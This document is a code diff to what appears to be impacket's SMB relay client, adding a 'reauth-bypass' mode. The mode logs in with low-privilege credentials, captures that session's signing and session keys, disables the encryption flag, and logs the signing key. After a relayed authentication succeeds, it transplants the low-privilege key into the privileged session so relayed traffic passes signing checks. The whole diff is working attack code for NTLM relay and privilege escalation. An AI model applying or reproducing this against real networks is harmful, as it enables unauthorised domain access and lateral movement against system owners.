@@ -264,7 +264,24 @@ class SMBRelayClient(ProtocolClient):
             self.session.close()
             self.session = None
 
+    def _reauth_init(self):
+        from impacket.smb3structs import SMB2_SESSION_FLAG_ENCRYPT_DATA
+        domain, user, password = self.serverConfig.reauth_creds
+        self.session = SMBConnection(self.targetHost, self.targetHost, sess_port=self.targetPort)
+        self.session.login(user, password, domain)
+        v2 = self.session.getSMBServer()
+        self._reauth_sign_key = v2._Session['SigningKey']
+        self._reauth_sess_key = v2._Session['SessionKey']
+        LOG.info('[reauth-bypass] base session as %s\\%s SID=0x%x signingKey=%s'
+                 % (domain, user, v2._Session['SessionID'], self._reauth_sign_key.hex()))
+        v2._Session['SessionFlags'] = v2._Session.get('SessionFlags', 0) & ~SMB2_SESSION_FLAG_ENCRYPT_DATA
+        v2._Session['EncryptData'] = False
+        return True
+
     def initConnection(self):
+        if getattr(self.serverConfig, 'reauth_bypass', False):
+            return self._reauth_init()
+
         self.session = SMBConnection(self.targetHost, self.targetHost, sess_port= self.targetPort, manualNegotiate=True)
                                      #,preferredDialect=SMB_DIALECT)
         if self.serverConfig.smb2support is True:
@@ -538,6 +555,14 @@ class SMBRelayClient(ProtocolClient):
         if signingKey:
             logging.info("Enabling session signing")
             self.session._SMBConnection.set_session_key(signingKey)
+
+        if getattr(self.serverConfig, 'reauth_bypass', False) and errorCode == 0:
+            v2 = self.session.getSMBServer()
+            v2._Session['SigningKey'] = self._reauth_sign_key
+            v2._Session['SessionKey'] = self._reauth_sess_key
+            v2._Session['SigningRequired'] = True
+            v2._Session['SigningActivated'] = True
+            LOG.info('[reauth-bypass] SUCCESS - privileged session, signing with low-priv key')
 
         return token, errorCode
 
